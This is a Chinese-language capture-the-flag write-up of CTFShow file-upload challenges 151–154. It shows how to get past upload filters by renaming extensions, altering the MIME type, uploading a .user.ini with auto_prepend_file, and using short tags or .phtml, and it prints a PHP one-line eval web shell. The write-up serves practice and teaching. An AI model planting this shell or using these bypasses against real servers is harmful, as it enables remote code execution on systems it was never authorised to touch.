# CTFSHOW 文件上传（151-170）
## 151
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784951445972_image.png)
直接修改png为php

然后写一个文件一句话木马`<?php eval($_POST[1]);?>`

上传文件，`/upload/1.php`然后POST传参 ，flag在“../flag.php”

## 152
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784951789432_image.png)
尝试上题操作，后端加了验证

将后缀改为png，可以上传，访问后图片是被包裹的
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784951890503_image.png)
抓包，重放修改，后端对文件类型进行验证
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784952659681_image.png)
修改文件类型后，上传成功
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784952757421_image.png)
下面就是找目录，找flag

## 153
对文件名php进行过滤，大写可以绕过但是
文件名大写是不可以解析的必须小写。

发现在`/upload/`有index.php

可以利用`.user.ini` 是**PHP 专属的自定义配置文件**，属于目录级 PHP 配置，作用于当前文件夹及其所有子目录，仅对 PHP 生效

`.user.ini`中两个中的配置就是auto_prepend_file和auto_append_file。这两个配置的意思就是：我们指定一个文件（如1.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），相当于在index.php中插入一句：require(./1.jpg)。这两个设置的区别只是在于auto_prepend_file是在文件前插入，auto_append_file在文件最后插入

利用`.user.ini`的前提是服务器开启了CGI或者FastCGI，并且上传文件的存储路径下有index.php可执行文件。
	
	auto_prepend_file = <filename>         //包含在文件头
	auto_append_file = <filename>          //包含在文件尾
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785023060883_image.png)
上传`.user.ini`文件前要改一下前端的过滤

![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785022502325_image.png)
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785022111983_image.png)
传入2个文件，`.user.ini`用于包含`1.txt`,`1.txt`来被解析去执行一句话木马

访问/upload  是这样的话就成功了
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785022604146_image.png)
接下来就是post给1传值，在../发现flag


## 154
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785023060883_image.png)
继续上题操作
在上传1.txt的时候
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785023392799_image.png)
这题多了对文件内容的检测

二分法排除，对内容php进行检测，除了php还可以使用短标签，`php`->`=`
其他的不变。
访问/upload  是这样的话就成功了
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785022604146_image.png)
接下来就是post给1传值，在../发现flag

----
也可以使用`.phtml`作为后缀

`.phtml` 本质**就是 PHP 文件**，和 `.php` 功能完全一致，只是后缀不同。

----















































